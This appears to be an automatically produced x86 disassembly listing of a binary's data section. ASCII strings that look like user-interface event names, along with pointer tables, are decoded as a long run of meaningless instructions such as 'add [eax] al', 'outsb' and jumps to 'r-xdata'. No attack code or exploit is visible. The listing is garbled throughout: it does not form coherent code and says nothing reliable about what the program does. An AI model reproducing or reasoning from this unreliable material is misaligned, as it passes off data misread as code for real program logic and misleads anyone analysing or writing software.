add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
push cs
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
js r-xdata
add [ eax ] al
dec edi
jbe r-xdata
pushfd
push eax
outsd
jo r-xdata
jns r-xdata
jb r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
add [ eax + 0x4f070037 ] al
mov ah 0x5a
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090035 ] al
outsb
inc ebp
outsb
jo r-xdata
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp eax 0x6e4f0b00
jb r-xdata
inc esp
outsd
pop edx
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060038 ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al [ eax ]
or cl [ edi + 0x6e ]
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe942f0da
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0033 ] al
outsb
inc esp
jb r-xdata
jpo r-xdata
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ah 0x5a
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
pop edx
inc ecx
add [ eax ] ch
add [ eax ] eax
[ eax ]
popad
dec ebp
outsd
jbe r-xdata
dec ebp
outsd
jne r-xdata
dec edi
outsb
jae r-xdata
jns r-xdata
je r-xdata
add [ eax ] 0x0
add [ eax + 0x4f090036 ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
inc esp
jb r-xdata
dec ebx
jns r-xdata
bound eax [ eax ]
mov eax eax
inc esp
inc ebx
ja r-xdata
dec edi
or [ ecx + 0x44 ] bh
add al ah
add [ eax ] al
jmp eax
in al 0x79
inc esp
add al ch
add [ eax ] eax
loopne r-xdata
jo r-xdata
outsb
inc ebp
js r-xdata
add bh bh
enter 0x1 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp [ eax ] al
push es
dec edi
jns r-xdata
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
pop edx
jo r-xdata
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
add [ eax ] al
add al al
inc ecx
add al dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
jb r-xdata
jb r-xdata
je r-xdata
push ebx
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ ecx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003c ] al
outsb
dec ebp
outsd
jne r-xdata
jns r-xdata
add al bl
add [ eax ] eax
mov ah 0x5a
jpe r-xdata
jns r-xdata
xor [ edx + 0x44 ] bh
add al ah
add [ eax ] eax
jmp eax
int3
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] ch
inc ebx
add [ eax + eax ] dl
add [ eax ] al
shl [ ebp + 0x41 ] 0x0
dec ecx
je r-xdata
je r-xdata
ja r-xdata
add [ eax ] cl
adc [ ebp + ecx * 2 + 0x65 ] edx
popad
insd
inc ebp
jbe r-xdata
jb r-xdata
je r-xdata
add [ ebx + 0x43f344c0 ] cl
inc esp
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
push ebp
jo r-xdata
arpl [ ebx + 0x54 ] bp
jpo r-xdata
inc esp
outsd
ja r-xdata
add al dl
add [ eax ] al
call eax
arpl [ ebx - 0x64 ] bp
jpo r-xdata
add [ eax + 0x4f0a0034 ] al
outsb
inc esp
jb r-xdata
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add al bl
add [ eax ] al
inc esp
insd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
add [ eax ] al
add [ eax ] al
insd
inc ebp
jbe r-xdata
inc ecx
add [ ecx + esi - 0x5fefffbc ] dl
inc ecx
add ah bl
xor [ eax + eax - 0x8 ] al
xor [ eax + eax - 0x30 ] al
mov al [ 0xffffffffa5f80041 ]
inc ecx
add [ eax + 0x31 ] dh
inc esp
add [ edi - 0x57e3ffbf ] dl
inc ecx
add [ edx + esi - 0x569bffbc ] ah
inc ecx
add [ eax ] cl
fwait
inc ecx
add [ ebx + ebx * 4 ] ch
inc ecx
add [ eax - 0x65 ] dl
inc ecx
add ah ch
xor [ eax + eax + 0x5c ] eax
xor al [ eax + eax - 0x54 ]
sahf
inc ecx
add [ eax + 0x41 ] bh
add [ edx + esi + 0x44 ] bh
add [ eax ] dl
mov [ 0xffffffffa3e40041 ] eax
inc ecx
add [ eax + 0x1800402a ] ch
movsb [ edi ] [ esi ]
inc ecx
add [ eax - 0x5c ] cl
inc ecx
add [ esp - 0x5ab7ffbf ] bl
inc ecx
add al ah
cmpsb [ esi ] [ edi ]
inc ecx
add [ eax ] bh
cmpsd [ esi ] [ edi ]
inc ecx
add ah cl
cmpsd [ esi ] [ edi ]
inc ecx
add [ esi ] dl
push esp
inc ebx
jne r-xdata
add [ eax ] cl
pushfd
jb r-xdata
jb r-xdata
je r-xdata
jae r-xdata
dec ebp
popad
outsb
je r-xdata
and al 0x8b
inc esp
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ ebx + 0x43f3e8c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + esi * 8 + 0x43 ] al
add [ eax ] al
add [ eax ] al
cmp al 0x10
add [ ebx + ecx * 4 ] ah
inc esp
add [ eax + edx ] bh
inc eax
add [ eax ] al
add [ eax ] al
add [ edx + 0x40 ] dl
lea eax [ bx + si ]
aam 0xf2
inc ebx
add [ eax ] cl
push cs
push esp
inc esp
jb r-xdata
adc [ edx + edx * 2 ] al
dec ecx
outsb
je r-xdata
jge r-xdata
insb
or edx [ edi + edx * 2 + 0x69 ]
outsb
inc ebx
outsd
outsb
je r-xdata
outsb
push ebx
je r-xdata
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0040 ] al
cmp [ ecx + 0x44 ] 0x0
add ah cl
push ss
inc edx
add ah bh
xor al 0x40
add [ eax + edx ] cl
inc edx
add [ esi + 0xc300040 ] al
add [ eax ] al
add [ eax ] al
adc dh dh
inc ebx
add [ eax - 0xa ] ah
inc ebx
add [ edx + eax ] ah
je r-xdata
add [ eax ] al
push 0x140043f4
outsb
je r-xdata
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
push es
add al 0x8
pop es
inc ebx
outsd
outsb
je r-xdata
je r-xdata
outsd
jb r-xdata
je r-xdata
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003f ] al
outsb
push ebx
je r-xdata
jb r-xdata
outsd
insb
add [ 0x65646e49 ] al
js r-xdata
inc ebp
xor eax 0xc300040
imul ebp [ esi + 0x67 ] 0xf4849073
inc ebx
add [ edi ] al
push ss
push esp
inc ebx
jne r-xdata
add ecx [ eax ]
pop es
inc ebx
outsd
outsb
je r-xdata
jb r-xdata
outsd
push 0x6e490774
andps xmm1 [ edi + 0x77 ]
add [ esi ] eax
dec ecx
outsb
je r-xdata
arpl [ gs : ebp + eax + 0x54 ] si
add al 0x52
push edx
arpl [ gs : eax + eax + 0x5 ] si
push ebx
je r-xdata
arpl [ ebp + eax + 0x54 ] si
jb r-xdata
pop es
jb r-xdata
inc eax
xor al [ eax ]
pop esp
xor al [ eax ]
fcomp [ edx - 0x6ff7ffbf ]
inc ecx
add [ eax ] dl
popfd
inc ecx
insb
add [ 0x65646e49 ] al
js r-xdata
xor al 0x44
add al dl
cmp eax [ ebp ]
clc
add eax [ ebp ]
and al 0x8f
je r-xdata
add [ eax + 0x32 ] al
inc eax
add [ esi + 0x34f80040 ] al
inc eax
outsd
inc eax
add al bh
xor al 0x40
add [ 0x35040040 ] dh
insb
or edx [ edi + edx * 2 + 0x69 ]
outsb
inc ebx
outsd
outsb
je r-xdata
add [ edx + esi + 0x40 ] bl
add al bl
0x90080041 0x41
adc [ ebp - 0x63f7ffbf ] bl
jb r-xdata
outsb
jb r-xdata
add eax 0x74617453
andps xmm1 [ gs : edi + 0x77 ]
inc esp
outsd
add al dl
insd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
inc eax
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
adc [ edx ] al
add al 0x35
inc eax
add [ eax ] dh
or al 0x45
je r-xdata
inc ecx
add [ edi + edi ] al
imul ebp [ esi + 0x67 ] 0x43f3e873
add [ eax + 0x4166 ] ch
add [ eax ] cl
push ebx
je r-xdata
inc esp
add [ edi * 4 - 0xf53ffbc ] bl
inc esp
add [ esi + eax * 8 + 0x44 ] bl
add ah ah
push ss
inc edx
inc ebx
je r-xdata
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
push ss
inc edx
add ah bl
xor eax [ eax + eax - 0x1c ]
inc ebp
add [ eax ] al
cmp al 0x45
add [ ebx + edi + 0x45 ] cl
add [ eax + 0x600044bb ] dl
xor [ ebp ] eax
xor [ ecx ] 0x45
add [ eax - 0x27ffbad2 ] bl
mov edx 0xbadc0044
inc esp
add [ eax - 0x15 ] dl
inc esp
add [ ebx + ebp * 8 + 0x44 ] bh
add [ esi + eax * 8 + 0x44 ] al
add [ esp + edi * 4 + 0x44 ] dl
add al dl
mov [ eax + eax + 0x48 ] 0x5c0044c7
0x44
insb
jae r-xdata
add [ esp + edx * 4 + 0x44 ] dl
add [ ebp - 0xaffffc0 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + esi * 8 + 0x43 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
test [ ebx ] 0x60
test [ ebx ] 0x64
add al [ eax ]
sub_43ffe8
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070031 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ edx ] al
add bh bh
xor [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al [ eax ]
or [ edi + 0x6e ] ecx
add [ eax ] al
xor [ 0x6e4f0a00 ] 0x44
push ebp
jo r-xdata
add [ eax - 0x80000000 ] al
cmp [ eax ] al
or cl [ edi + 0x6e ]
inc esp
jb r-xdata
inc esp
jb r-xdata
jb r-xdata
sub [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al 0x0
or cl [ edi + 0x6e ]
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe9430077
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0035 ] al
add [ eax + eax + 0x30 ] 0x1
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor eax [ eax ]
push cs
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
mov ah 0x5a
jo r-xdata
outsb
jo r-xdata
add [ eax ] al
js r-xdata
jns r-xdata
je r-xdata
inc ebp
outsb
inc esp
jb r-xdata
outsd
mov ah 0x5a
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07003b ] al
outsb
inc ebp
outsb
je r-xdata
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090039 ] al
outsb
ja r-xdata
jpe r-xdata
inc ebp
outsb
add [ eax - 0x80000000 ] al
cmp [ eax ] eax
dec edi
jbe r-xdata
shl dl 0x1
inc ebx
push eax
outsd
jo r-xdata
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0042 ] al
jo r-xdata
outsb
inc ebp
js r-xdata
add bh bh
jns r-xdata
dec ebx
jns r-xdata
enter 0x1 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp al 0x0
push es
dec edi
enter 0x1 0xff
pushfd
jpo r-xdata
jns r-xdata
jb r-xdata
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06003c ] al
pop edx
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
add [ eax + 0x4f0a0036 ] al
outsb
inc esp
jb r-xdata
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
or [ edi + 0x6e ] ecx
jb r-xdata
add [ eax ] 0x0
add [ eax + 0x4f09003a ] al
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0037 ] al
outsb
inc esp
jb r-xdata
add al [ eax ]
inc [ eax + 0x1ff0002 ]
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
jb r-xdata
add [ eax ] cl
dec edi
outsb
push ebx
insb
inc ebx
add [ eax - 0x7700fffe ] cl
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0040 ] al
outsb
dec ebp
popad
jae r-xdata
jae r-xdata
add al bl
add [ eax ] eax
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
inc ecx
add [ eax ] ah
add al [ eax ]
jmp [ eax ]
jb r-xdata
inc esp
outsb
dec edi
insd
mov ah 0x5a
inc ecx
add [ eax ] ch
add al [ eax ]
[ eax ]
outsb
inc esp
dec edi
add [ eax - 0x7f00fffe ] al
add al [ eax ]
inc [ ecx ]
inc ebx
outsd
arpl [ ebx - 0x64 ] bp
jpo r-xdata
inc ebx
insb
outsd
jae r-xdata
inc ecx
add [ eax ] dh
add al [ eax ]
push [ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090032 ] al
outsb
pop edx
inc ecx
add [ eax ] ch
add [ eax ] eax
[ eax ]
add [ eax ] al
add [ esp + eax * 4 + 0x34f00044 ] bl
inc eax
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc esp
add [ eax + eax ] ch
add [ eax ] al
pushfd
test [ eax + eax - 0x10 ] al
xor al 0x40
inc esp
outsd
arpl [ ebx + 0x54 ] bp
jpo r-xdata
test al 0x66
jb r-xdata
outsb
push ebx
je r-xdata
add bh bh
add [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edx
add [ ebx ] cl
dec edi
in al 0x79
inc esp
add al ch
add [ eax ] eax
insd
mov ah 0x5a
xor [ edx + 0x44 ] bh
add al ah
add [ eax ] eax
jmp eax
mov [ eax + eax - 0x1c ] 0x16
je r-xdata
cld
add al [ eax + eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3 ] bh
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0043 ] al
arpl [ gs : esp + ebx * 2 + 0x7d ] si
inc esp
add [ eax ] al
add [ eax ] eax
inc [ eax ]
outsb
push ebx
je r-xdata
inc ebx
add [ ebx ] cl
dec ecx
je r-xdata
inc edx
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
push ss
inc edx
add ah ch
push eax
inc esp
add ah ah
inc ebp
add [ eax ] al
cmp al 0x45
add [ ebx + edi + 0x45 ] cl
add [ eax + 0x600044bb ] dl
xor [ ebp ] eax
xor [ ecx ] 0x45
add [ eax - 0x27ffbad2 ] bl
mov edx 0xbadc0044
inc esp
add [ eax - 0x15 ] dl
inc esp
add [ ebx + ebp * 8 + 0x44 ] bh
add [ esi + eax * 8 + 0x44 ] al
add [ esp + edi * 4 + 0x44 ] dl
add al dl
mov [ eax + eax + 0x48 ] 0x5c0044c7
0x44
inc esp
add [ esi + eax * 8 + 0x44 ] bl
add ah ah
push ss
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x3d8c08b
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
add al 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x3dffbbfc ] ch
add al 0x44
add [ edx + eax ] cl
add [ eax ] al
jo r-xdata
inc eax
add al bh
xor al 0x40
jb r-xdata
dec edi
inc ebp
add [ edi + esi * 4 + 0x44 ] bh
add al ch
xchg edx eax
inc ebp
add al bl
mov bh 0x44
add [ eax - 0x7ffbbb0 ] cl
mov bh 0x44
add al bh
xchg edx eax
inc ebp
add al dl
in eax dx
inc esp
add ah ch
mov eax 0xb92c0044
inc esp
add [ eax ] bl
mov eax 0x930c0044
inc ebp
add [ eax ] dl
xchg ebx eax
inc ebp
add [ eax + edi * 4 ] bh
inc esp
add [ ebp + esi * 4 + 0x54110044 ] ch
inc edx
jne r-xdata
xchg edx eax
inc esp
add ah cl
push ss
inc edx
add ah bh
xor al 0x40
add [ eax + edx ] cl
inc edx
add [ esi + 0xc300040 ] al
inc ebp
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax ] cl
out dx eax
inc esp
add al dl
cmp eax [ ebp ]
clc
add eax [ ebp ]
and al 0x8f
inc ecx
add [ eax + 0x1c0044e9 ] al
mov ebp 0xf0ac0044
add ah ch
pop ss
inc edx
add [ eax + 0x200044b7 ] dh
sbb [ edx ] al
pop esp
mov eax 0x17700044
inc edx
add [ eax + ebx ] al
inc edx
add [ eax + 0x18 ] bl
inc edx
add [ esi + esi * 4 + 0x50500044 ] bl
inc esp
add [ eax ] dl
mov bh 0x44
add [ edx + edx * 4 + 0x45 ] bl
add al cl
in eax dx
inc esp
add [ eax + 0x440044b8 ] cl
mov bh 0x44
add [ edx + edx * 4 - 0x6d3fffbb ] ch
inc esp
jb r-xdata
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0x2c004217 ] bh
push eax
inc esp
inc ecx
add [ edx + eax ] bh
add bh bh
or al 0x1
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc esp
add [ 0x6d657449 ] al
jae r-xdata
test al 0x66
sub_440504
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushad
push es
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
push es
inc esp
add [ edx + 0x6 ] dl
inc esp
add [ eax ] bl
add al [ eax ]
add [ ebx + eax + 0x16cc0044 ] cl
inc edx
add ah bh
xor al 0x40
add [ eax + edx ] cl
inc edx
add [ esi + 0xc300040 ] al
inc ebp
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax ] cl
out dx eax
inc esp
add al dl
cmp eax [ ebp ]
clc
add eax [ ebp ]
and al 0x8f
inc ecx
add [ eax + 0x1c0044e9 ] al
mov ebp 0xf0ac0044
inc esp
add [ esi + eax * 8 + 0x44 ] bl
add ah ah
push ss
inc edx
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
push ss
inc edx
add al ah
push edx
inc esp
add ah ah
inc ebp
add [ eax ] al
cmp al 0x45
add [ ebx + edi + 0x45 ] cl
add [ eax + 0x600044bb ] dl
xor [ ebp ] eax
xor [ ecx ] 0x45
add [ eax - 0x27ffbad2 ] bl
mov edx 0xbadc0044
inc esp
add [ eax - 0x15 ] dl
inc esp
add [ ebx + ebp * 8 + 0x44 ] bh
add [ esi + eax * 8 + 0x44 ] al
add [ esp + edi * 4 + 0x44 ] dl
add al dl
mov [ eax + eax + 0x48 ] 0x5c0044c7
0x44
sub_4405bc
or cl cl
inc esp
add [ eax + 0x4451 ] bh
in al dx
inc esp
add ah ch
inc ebp
add [ eax - 0x5bffbad1 ] ch
sub al [ ebp ]
mov [ edi ] gs
inc ebp
add [ ecx + esi * 8 ] ah
inc esp
add [ eax + 0x580044f7 ] bh
add eax 0x53f40045
inc esp
add [ eax + 0x2 ] al
inc ebp
add [ eax ] dh
push esp
inc esp
add al dh
add eax 0x5f40045
inc ebp
add [ esp + eax + 0x4540045 ] ch
inc ebp
add ah cl
xor [ ebp ] al
pushfd
push cs
inc ebp
add al al
inc edx
inc ebp
add [ eax + 0x2d ] cl
inc ebp
add [ eax ] bh
xor [ ebp ] al
nop
push ecx
inc esp
add [ ecx + edx * 2 + 0x536c0044 ] dh
inc esp
add [ eax ] cl
add [ 0x7b006b0 ] al
mov al 0x11
mov ebp 0x14bd35
jmp r-xdata
dec eax
[ esp + edx * 2 + 0x44 ]
add ah cl
push esp
inc esp
add [ eax + 0x55 ] dl
inc esp
add [ eax + 0x54 ] cl
inc esp
add al dl
push ebp
inc esp
add [ ebp + edx * 2 + 0x53440044 ] ah
inc esp
add [ eax + 0x53 ] ch
inc esp
add [ edi ] al
push esp
inc edx
jne r-xdata
add dh bh
cwde
leave
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
je r-xdata
jae r-xdata
add [ eax + ecx * 8 + 0x44 ] dh
add [ eax + ecx * 8 - 0x173fffbc ] ah
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4307000f ] al
popad
jo r-xdata
push [ eax ]
outsb
mov eax eax
pushad
push es
inc esp
add [ edi ] al
pop es
push esp
inc edx
jne r-xdata
adc [ eax ] al
adc [ edx ] al
add bh bh
rcl [ ebx + 0x44 ] 0x0
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
fwait
add [ eax ] al
[ ebx + 0x1ff0000 ]
imul ebp [ edi + 0x6e ] r-xdata
je r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
adc [ edx ] eax
add bh bh
add [ eax ] cl
inc edx
je r-xdata
add [ eax ] dl
je r-xdata
add bh bh
cwde
in eax dx
inc esp
add [ ecx ] al
add [ eax + 0x4208000d ] al
outsb
dec esp
add eax 0x4d40044
inc esp
add [ ecx ] dh
add [ eax ] cl
push ebx
je r-xdata
adc [ eax ] eax
pop es
inc esp
popa
jne r-xdata
inc eax
push ebx
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
outsd
inc esp
add [ edx ] bh
add bh bh
jpe r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
jb r-xdata
push cs
add [ esi ] al
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
dec esp
ja r-xdata
or [ edx + 0x69 ] al
inc esp
imul ecx [ ebp + 0x6f ] 0x10006564
inc ebx
je r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc al [ eax ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
add [ eax ] al
adc eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ eax ] dl
add al [ eax ]
adc [ edx ] eax
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
jae r-xdata
[ eax - 0x37 ]
jae r-xdata
popad
add [ eax ] al
jmp [ eax + 0x3c0044bb ]
add [ eax ] dl
jb r-xdata
add bh bh
push 0x780044c9
leave
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040016 ] al
outsd
outsb
je r-xdata
jb r-xdata
pop ecx
inc ecx
add [ edi ] bl
add bh bh
jo r-xdata
add [ eax + eax ] bh
add dh bh
sar [ ebx + 0x10044 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4106000b ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
movsb [ edi ] [ esi ]
ja r-xdata
add dh bh
loopne r-xdata
outsd
inc esp
add [ edx + eax ] dl
add bh bh
adc al 0x2
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop ss
add [ ebx ] cl
ja r-xdata
inc eax
add [ ecx ] dl
add al [ eax ]
call [ ecx ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ ecx ] ah
add bh bh
mov al [ 0x3c0044bb ]
mov esp 0x44
add [ eax + 0x3 ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ eax ] cl
inc esp
jb r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc eax 0x6e450700
popad
bound ebp [ ebp + 0x64 ]
and [ ebx ] ch
inc edx
add [ eax ] ch
dec eax
imul ebp [ esi + 0x74 ] r-xdata
jl r-xdata
insb
je r-xdata
adc [ eax ] al
push eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0010 ] al
outsd
outsb
jae r-xdata
insb
dec ebp
outsd
popad
insb
push edx
jae r-xdata
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
dec ebp
outsd
add [ gs : eax ] dl
add bh bh
sub al 0xc8
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5009001b ] al
outsd
jo r-xdata
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
xchg esp eax
mov [ eax + eax + 0x40 ] 0x44e9
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
pop ds
add [ edi ] al
push esi
imul esi [ ebx + 0x69 ] 0x656c62
adc [ eax ] al
or [ edx ] eax
add bh bh
int3
jo r-xdata
movsb [ edi ] [ esi ]
add [ eax ] eax
outsb
jne r-xdata
adc [ eax ] al
cdq
add [ eax ] al
inc esp
leave
inc esp
add [ ecx + ecx * 8 + 0x44 ] cl
add [ eax - 0x80000000 ] al
sbb al 0x0
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
imul ebp [ esi + 0x74 ] r-xdata
push esp
xor al [ ebp ]
aam 0x32
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
sub_44096f
push edx
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and [ eax ] al
or [ edi + 0x6f ] dl
jb r-xdata
add [ eax ] al
and [ ebx ] 0x0
or cl [ edi + 0x6e ]
inc esp
jb r-xdata
push edi
jb r-xdata
add [ eax ] 0x0
add [ eax + 0x4f090026 ] al
inc esp
jb r-xdata
jo r-xdata
dec ebx
jns r-xdata
mov ah 0x5a
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
pop edx
jo r-xdata
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
pop edx
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
